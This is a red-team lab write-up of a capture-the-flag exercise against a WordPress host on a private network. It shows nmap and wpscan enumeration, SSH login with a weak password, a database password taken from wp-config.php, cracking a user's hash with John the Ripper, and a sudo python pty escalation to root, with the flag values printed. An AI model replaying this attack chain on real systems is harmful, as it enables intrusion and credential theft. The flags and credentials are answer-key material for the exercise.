# Red Team: Summary of Operations

## Table of Contents

- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap 192.168.1.110 -sV -O
  PORT    SERVICE
  22/tcp  ssh
  80/tcp  http
  111/tcp rpcbind
  139/tcp netbios-ssn
  445/tcp netbios-ssn
  OS details: Linux 3.2 - 4.9
```

![nmapImage](/Images/Target1_nmapScan.png)

This scan identifies the services below as potential points of entry:

- Target 1
  - ssh (OpenSSH/6.7p1)
  - http (Apache/2.4.10)

The following vulnerabilities were identified on each target:

- Target 1
  - Wordpress Enumeration (MILD)
  - Weak Password (MILD)
  - OpenSSH (SEVERE)
  - Escalation to root (SEVERE)

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:

- Target 1

  - `flag1.txt`: {b9bbcb33e11b80be759c4e844862482d}

    - Found the flag when inspecting HTML file of the services page on the RavenSecurity Website
      ![flag1](/Images/flag1_RavenWebsite.png)

  - `flag2.txt`: {fc3fd58dcdad9ab23faca6e9a36e581c}

    - wpscan/Weak Password/openSSH

      - Used wpscan to find accounts on the website

      ```bash
        wpscan --url http://192.168.1.110/wordpress --eu
      ```

      - SSHed into target1 through michaels account (used weak password.)

      ```bash
        ssh michael@192.168.1.110
      ```

      - Navigated to /var/www and found flag2

        ![flag2](/Images/flag2_michaelwww.png)

  - `flag3`: {afc01ab56b50591e7dccf93122770cd2}

    - Navigated to /var/www/html and found the wp-config.php file.
    - upon reading the file I found the MySQLDBPassword.
      cat wp-config.php
      ![MySQL_Password](/Images/MySQL_Password.png)
    - Then Logged into the mysql database using found login.

    ```bash
      mysql -h localhost -u root -pR@v3nSecurity
    ```

    ![Mysql_Login](/Images/mySQL_get_in_and_show_databases.PNG)

    - Then accessed the wordpress database and used a sql request.

    ```sql
    SELECT * From wp_posts;
    ```

    in order to find the flag within the table.
    ![flag3](/Images/flag3.png)

  - `flag4`: {715dea6c055b9fe3337544932f2941ce}

    - Escalation to root/openSSH

      - Found the hashed password for steven within the wp_users table.
        ![hashed_password](/Images/MYSQL_get_hashes.PNG)
      - Then used John the ripper to crack the hashed password (pink84).
        ![CrackedHash](/Images/use_John_to_crack_steven_PW_pink84.PNG)
      - Then sshed into target1 using stevens account.
      - Used a python script to get escalate to root privilege.
        ```bash
        sudo python -c 'import pty;pty.spawn("/bin/bash")'
        ```
        ![EscalationToRoot](/Images/steven_getshell_and_Root.PNG)
      - Then used cat to read flag4

        ![flag4](/Images/flag4Command.PNG)
